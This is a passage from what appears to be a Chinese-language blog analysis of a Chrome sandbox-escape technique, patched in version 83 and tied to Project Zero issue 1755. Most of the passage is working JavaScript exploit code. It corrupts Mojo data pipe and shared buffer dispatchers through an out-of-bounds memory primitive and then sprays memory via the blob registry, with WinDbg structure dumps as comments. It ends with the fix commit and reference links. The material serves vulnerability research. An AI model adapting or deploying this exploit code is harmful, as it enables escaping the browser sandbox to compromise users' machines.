// (*((chrome_child!base::subtle::PlatformSharedMemoryRegion *)0x26d068599c0))                 [Type: base::subtle::PlatformSharedMemoryRegion]
//     [+0x000] handle_          [Type: base::win::GenericScopedHandle<base::win::HandleTraits,base::win::VerifierTraits>]
//     [+0x008] mode_            : kUnsafe | kMaxValue (2) [Type: base::subtle::PlatformSharedMemoryRegion::Mode]
//     [+0x010] size_            : 0x40000000 [Type: unsigned __int64]
//     [+0x018] guid_            [Type: base::UnguessableToken]

  for (var i = 0; i < pipe_dispatchers.length && i < dupe_dispatchers.length; ++i) {
    // swap DataPipeProducerDispatcher and SharedBufferDispatcher's region_
    oob.memswap(pipe_dispatchers[i] + 0x80n,
                dupe_dispatchers[i] + 0x20n,
                0x28n);

    // 0:022> dx -r1 (*((chrome_child!MojoCreateDataPipeOptions *)0x26d70d047f0))
    // (*((chrome_child!MojoCreateDataPipeOptions *)0x26d70d047f0))                 [Type: MojoCreateDataPipeOptions]
        // [+0x000] struct_size      : 0x10 [Type: unsigned int]
        // [+0x004] flags            : 0x0 [Type: unsigned int]
        // [+0x008] element_num_bytes : 0x1 [Type: unsigned int]
        // [+0x00c] capacity_num_bytes : 0x1000 [Type: unsigned int]
    // modify element_num_bytes and capacity_num_bytes
    oob.setUint32(pipe_dispatchers[i] + 0x18n, 0x40000000);
    oob.setUint32(pipe_dispatchers[i] + 0x1cn, 0x40000000);
  }
  print('  [*] spraying');

  let ab = new ArrayBuffer(1);
  alert("before spraying");
  for (var i = 0; i < pipes.length; ++i) {
    blob_registry_ptr.registerFromStream("", "", 0x1, pipes[i].consumer, null);
    pipes[i].producer.writeData(ab);
  }

  return () => {
    print('[7] freeing spray')
    let ab = new ArrayBuffer(0xfff);
    for (var i = 0; i < pipes.length; ++i) {
      pipes[i].producer.writeData(ab);
    }

    print('[7] freeing spray2')

    for (var i = 0; i < pipes.length; ++i) {
      pipes[i].producer.close();
    }


    for (var i = 0; i < dupes.length; ++i) {
      dupes[i].handle.close();
    }
    print('[7] done');
  };
}
```

该内存喷射手法在83.0.4086.0中被修复，对应commit：https://github.com/chromium/chromium/commit/9e64c392b9d6f6e9215cf060ecb5690d3f5cc2eb#diff-0ade0ea248ab4ac9455e8fb7651882bb79e933711d6de7fcdefbee00a44b999e

## 参考链接

https://www.anquanke.com/post/id/231412

https://bugs.chromium.org/p/project-zero/issues/detail?id=1755

https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html